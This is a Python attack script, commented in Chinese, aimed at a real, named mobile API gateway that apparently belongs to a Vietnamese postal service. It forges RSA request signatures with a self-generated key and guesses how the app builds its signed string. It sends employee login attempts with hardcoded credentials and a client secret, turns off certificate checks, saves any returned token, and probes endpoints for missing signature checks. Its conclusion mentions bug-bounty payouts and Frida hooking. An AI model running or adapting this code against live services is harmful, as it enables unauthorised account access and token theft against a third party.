#!/usr/bin/env python3
"""
RSA签名V2 - 尝试完整的签名字符串（包含所有device信息）
"""

import requests
import json
import urllib3
import base64
import datetime
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend

urllib3.disable_warnings()

print("="*70)
print(" RSA签名测试 V2 - 包含完整设备信息")
print("="*70)

# 生成RSA密钥对
print("\n[1] 生成RSA密钥对...")
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)

public_key = private_key.public_key()
public_key_pem = public_key.public_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)
public_key_b64 = base64.b64encode(public_key_pem).decode('utf-8')

# 设备信息
device_id = "test_device_001"
device_name = "Python Simulator"
device_model = "Test Model"
date_time = datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S")
time_zone = "GMT+07:00"
platform = "android"
version = "1.1.5"
client_id = "android_app_987654"

# 登录数据
login_data = {
    "phone": "difoco",
    "password": "43824893"
}

request_data = {
    "channel": "ANDROID",
    "code": "EMPLOYEE_LOGIN_V2",
    "data": json.dumps(login_data, separators=(',', ':')),
    "signature": ""
}

print("\n[2] 测试不同的签名字符串构造...")

# 测试1：根据buildSignString (filled-new-array)的顺序
# 可能的参数顺序：device_id, device_name, device_model, date_time, time_zone, platform, version, client_id
test_cases = [
    {
        "name": "完整设备信息（8参数）",
        "params": [device_id, device_name, device_model, date_time, time_zone, platform, version, client_id]
    },
    {
        "name": "完整设备信息 + Token（9参数，Token为空）",
        "params": [device_id, device_name, device_model, date_time, time_zone, platform, version, client_id, ""]
    },
    {
        "name": "code + data + channel + signature",
        "params": [request_data["code"], request_data["data"], request_data["channel"], request_data["signature"]]
    },
    {
        "name": "混合：设备信息 + 请求信息",
        "params": [device_id, device_name, device_model, date_time, time_zone, platform, version, client_id, request_data["code"], request_data["data"]]
    },
]

for idx, test in enumerate(test_cases, 1):
    print(f"\n{'='*70}")
    print(f"[测试 {idx}] {test['name']}")
    print(f"{'='*70}")
    
    # 构造签名字符串
    sign_string = " | ".join(test['params'])
    print(f"签名字符串: {sign_string[:150]}...")
    
    # 生成签名
    signature_bytes = private_key.sign(
        sign_string.encode('utf-8'),
        padding.PKCS1v15(),
        hashes.SHA256()
    )
    signature_b64 = base64.b64encode(signature_bytes).decode('utf-8')
    
    # 构造Headers
    headers = {
        'X-Client-ID': client_id,
        'X-Client-Secret': 'android_s3cr3t_uvwxzy',
        'Content-Type': 'application/json',
        'platform': platform,
        'device_name': device_name,
        'device_model': device_model,
        'device_id': device_id,
        'date_time': date_time,
        'time_zone': time_zone,
        'version': version,
        'signature': signature_b64,
        'public_key': public_key_b64,
    }
    
    # 发送请求
    try:
        r = requests.post(
            "https://gwmobile.emsone.com.vn/execute",
            json=request_data,
            headers=headers,
            timeout=15,
            verify=False
        )
        
        result = r.json()
        code = result.get('Code')
        message = result.get('Message')
        
        print(f"响应: HTTP {r.status_code}, Code {code}")
        print(f"消息: {message}")
        
        if code == '00':
            print("\n✅✅✅ 成功！找到正确的签名构造！")
            print(json.dumps(result, indent=2, ensure_ascii=False))
            
            if 'Token' in result:
                with open('/workspace/extracted_token.txt', 'w') as f:
                    f.write(result['Token'])
                print(f"✓ Token已保存")
            break
            
        elif code == '01':
            print("✅ 签名有效！登录失败（账号密码错误）")
            break
            
        elif code == '95':
            print("❌ 签名验证失败")
            
        elif code == '97':
            print("❌ 需要Token")
            
    except Exception as e:
        print(f"错误: {e}")

print("\n" + "="*70)
print(" 最终测试：尝试没有Token的注册")
print("="*70)

# 最后尝试：如果登录需要特定公钥，注册可能不需要？
print("\n测试是否存在不验证签名的端点...")

# 查找可能的公开端点
public_endpoints = [
    "EMPLOYEE_COUNT_ACCOUNT",
    "EMPLOYEE_CHECK_CONDITION", 
    "COLLECTION_POST_OFFICE_SEARCH_LIST",
]

for endpoint in public_endpoints:
    test_request = {
        "channel": "ANDROID",
        "code": endpoint,
        "data": "{}",
        "signature": ""
    }
    
    # 简单签名
    simple_sign = " | ".join([endpoint, "{}", "ANDROID", ""])
    signature_bytes = private_key.sign(
        simple_sign.encode('utf-8'),
        padding.PKCS1v15(),
        hashes.SHA256()
    )
    
    headers['signature'] = base64.b64encode(signature_bytes).decode('utf-8')
    
    try:
        r = requests.post(
            "https://gwmobile.emsone.com.vn/execute",
            json=test_request,
            headers=headers,
            timeout=10,
            verify=False
        )
        
        result = r.json()
        if result.get('Code') not in ['95', '97']:
            print(f"\n✅ 找到可用端点: {endpoint}")
            print(json.dumps(result, indent=2, ensure_ascii=False))
            
    except:
        pass

print("\n" + "="*70)
print(" 结论")
print("="*70)
print("""
如果所有测试都返回 Code 95:
  → 服务器验证公钥必须来自AndroidKeyStore
  → 必须在真实Android设备上运行
  → 需要使用Frida Hook提取或生成签名

建议：
1. 立即提交商户系统漏洞（$2K-$8K）
2. 搭建Android环境继续挖掘（+$5K-$20K）
""")
